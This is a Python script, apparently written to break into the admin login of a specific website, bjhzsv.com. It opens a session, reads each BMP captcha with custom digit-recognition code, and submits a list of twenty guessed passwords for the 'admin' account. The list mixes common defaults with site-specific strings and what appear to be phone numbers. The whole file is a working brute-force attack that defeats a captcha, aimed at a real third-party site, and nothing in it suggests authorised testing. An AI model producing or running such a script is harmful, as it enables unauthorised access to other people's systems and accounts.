#!/usr/bin/env python3
"""bjhzsv.com auto-login with captcha OCR"""
import struct, requests, io, sys

BASE = "http://bjhzsv.com"
CU = BASE + "/main/inc/code.asp"
LU = BASE + "/main/a7chkuser.asp"
IU = BASE + "/main/index.asp"

PWS = ["admin","admin999","admin888","admin123","admin000",
"123456","admin2024","admin2025","admin@2024","admin@2025",
"bjhzsv","hzsv","admin666","admin111","admin001",
"13681449049","01062489782","admin2026",
"password","admin123456"]

def parse_bmp_captcha(bmp):
    """Parse 40x10 24bpp BMP captcha, return 4 digits."""
    if bmp[:2] != b"BM": raise ValueError("Not BMP")
    po = struct.unpack_from("<I", bmp, 10)[0]
    w = struct.unpack_from("<I", bmp, 18)[0]
    h = struct.unpack_from("<I", bmp, 22)[0]
    bpp = struct.unpack_from("<H", bmp, 28)[0]
    rs = ((w * bpp // 8) + 3) & ~3
    pd = bmp[po:]
    rows = []
    for y in range(h):
        start = y * rs
        row = []
        for x in range(w):
            b = pd[start + x*3]
            g = pd[start + x*3 + 1]
            r = pd[start + x*3 + 2]
            row.append((r,g,b))
        rows.append(row)
    rows = list(reversed(rows))
    print("  Grid (40x10):")
    for y in range(h):
        line = ""
        for x in range(w):
            r,g,b = rows[y][x]
            if r < 80 and g < 180: line += "#"
            elif r < 80 and g >= 180: line += "~"
            else: line += "."
        print("  " + line)

    segs = []; ind = False; ss = 0
    for x in range(w):
        hd = any(rows[y][x][0]<80 and rows[y][x][1]<180 for y in range(h))
        if hd and not ind: ss = x; ind = True
        elif not hd and ind: segs.append((ss,x-1)); ind = False
    if ind: segs.append((ss,w-1))
    print("  Segs: " + str(segs))
    if not segs: return "0000"
    while len(segs) > 4:
        mg = w; mi = 0
        for i in range(len(segs)-1):
            gp = segs[i+1][0] - segs[i][1]
            if gp < mg: mg = gp; mi = i
        segs[mi] = (segs[mi][0], segs[mi+1][1])
        del segs[mi+1]
    while len(segs) < 4:
        wi = max(range(len(segs)), key=lambda i: segs[i][1]-segs[i][0])
        s,e = segs[wi]; mid = (s+e)//2
        segs[wi] = (s,mid); segs.insert(wi+1,(mid+1,e))
    print("  Adj: " + str(segs))
    digs = []
    for idx,(s,e) in enumerate(segs):
        ra = [sum(1 for x in range(s,e+1) if rows[y][x][0]<80 and rows[y][x][1]<180) for y in range(h)]
        ca = [sum(1 for y in range(h) if rows[y][x][0]<80 and rows[y][x][1]<180) for x in range(s,e+1)]
        top = ra[0] > 0; mid = ra[h//2] > 0; bot = ra[-1] > 0
        left = ca[0] > 0; right = ca[-1] > 0
        t3 = sum(ra[:h//3]); m3 = sum(ra[h//3:2*h//3]); b3 = sum(ra[2*h//3:])
        print(f"  D{idx}: w={e-s+1} t={int(top)} m={int(mid)} b={int(bot)} l={int(left)} r={int(right)}")
        if top and bot and not mid and left and right: d="0"
        elif e-s+1 <= 3 and not left and right: d="1"
        elif top and mid and bot and not left and not right: d="2"
        elif top and mid and bot and not left and right: d="3"
        elif not top and mid and not bot and left and right: d="4"
        elif top and mid and bot and left and not right: d="5"
        elif top and not mid and not bot and right: d="7"
        elif top and mid and bot and left and right: d="8"
        elif m3 > t3 + b3 and left: d="4"
        elif e-s+1 <= 2: d="1"
        elif b3 > t3: d="2"
        else: d="8"
        digs.append(d)
    return "".join(digs)

def save_fail(bmp, reason=""):
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(bmp))
        img = img.resize((img.width*4, img.height*4), Image.NEAREST)
        img.save("/tmp/captcha_fail.png")
        print("  Saved /tmp/captcha_fail.png (" + reason + ")")
    except:
        open("/tmp/captcha_fail.bmp","wb").write(bmp)
        print("  Saved /tmp/captcha_fail.bmp (" + reason + ")")

def main():
    print("="*60)
    print("bjhzsv.com Auto-Login Script")
    print("="*60)
    sess = requests.Session()
    sess.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","Accept":"text/html,*/*","Accept-Language":"zh-CN,zh;q=0.9"})
    print("\n[1] Session...")
    try:
        r = sess.get(IU, timeout=30)
        print("  Index: " + str(r.status_code) + ", cookies: " + str(len(sess.cookies)))
    except Exception as e:
        print("  Fail: " + str(e)); return False
    print("\n[2] Trying " + str(len(PWS)) + " passwords...")
    for i,pw in enumerate(PWS):
        us = "admin"
        print("\n--- " + str(i+1) + "/" + str(len(PWS)) + ": " + us + ":" + pw + " ---")
        try:
            r = sess.get(CU, timeout=30)
            bmp = r.content
            print("  Captcha: " + str(len(bmp)) + " bytes")
        except Exception as e:
            print("  Fetch err: " + str(e)); continue
        try:
            captcha = parse_bmp_captcha(bmp)
        except Exception as e:
            print("  Parse err: " + str(e)); save_fail(bmp,"parse"); continue
        if not (len(captcha)==4 and captcha.isdigit()):
            save_fail(bmp,"bad_" + captcha); continue
        try:
            ld = {"t1":us,"t2":pw,"t3":captcha}
            r = sess.post(LU, data=ld, timeout=30)
            html = r.content.decode("gbk", errors="replace")
            print("  Resp: " + str(r.status_code))
            if "index.asp" in html and "history.go" not in html and "\u9519\u8bef" not in html[:200]:
                print("\n*** SUCCESS! " + us + ":" + pw + " ***")
                print(html[:500]); return True
            elif "\u9a8c\u8bc1\u7801" in html:
                print("  -> Wrong captcha")
            elif "\u5bc6\u7801" in html:
                print("  -> Wrong password")
            else:
                print("  -> " + html[:200])
                if "index" in html.lower():
                    print("\n*** POTENTIAL SUCCESS! ***"); return True
        except Exception as e:
            print("  Login err: " + str(e))
    print("\nAll failed."); return False
if __name__=="__main__":
    try:
        sys.exit(0 if main() else 1)
    except KeyboardInterrupt:
        print("\nInterrupted."); sys.exit(130)
